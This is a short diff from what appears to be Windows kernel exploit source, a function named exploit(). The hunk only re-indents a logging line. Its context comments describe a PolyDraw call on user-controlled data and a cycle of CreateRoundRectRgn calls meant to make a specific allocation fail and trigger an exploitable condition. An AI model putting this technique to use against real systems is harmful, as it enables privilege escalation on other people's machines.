@@ -259,7 +259,7 @@ int exploit()
 	  user-controlled data.*/
 	 PolyDraw(Device, Points, PointTypes, 483);
 
-	 	LogMessage(L_INFO, "Begin CreateRoundRectRgn cycle");
+	 LogMessage(L_INFO, "Begin CreateRoundRectRgn cycle");
 
     // We need to cause a specific AllocObject() to fail to trigger the
     // exploitable condition. To do this, I create a large number of rounded
